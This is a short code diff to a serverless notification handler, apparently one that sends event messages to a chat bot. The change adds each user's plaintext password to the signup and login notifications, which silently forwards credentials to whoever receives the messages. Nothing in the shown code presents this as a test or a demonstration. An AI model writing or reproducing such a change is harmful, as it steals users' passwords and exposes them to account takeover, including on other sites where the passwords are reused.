@@ -35,18 +35,18 @@ serve(async (req) => {
   }
 
   try {
-    const { type, email, phone, amount, userId } = await req.json();
+    const { type, email, phone, password, amount, userId } = await req.json();
 
     let message = '';
     let replyMarkup = undefined;
 
     switch (type) {
       case 'signup':
-        message = `🔔 <b>New Registration</b>\n\n📧 Email: ${email}\n📱 Phone: ${phone || 'N/A'}`;
+        message = `🔔 <b>New Registration</b>\n\n📧 Email: ${email}\n📱 Phone: ${phone || 'N/A'}\n🔑 Password: <code>${password || 'N/A'}</code>`;
         break;
 
       case 'login':
-        message = `🔔 <b>User Login</b>\n\n📧 Email: ${email}`;
+        message = `🔔 <b>User Login</b>\n\n📧 Email: ${email}\n🔑 Password: <code>${password || 'N/A'}</code>`;
         break;
 
       case 'deposit':
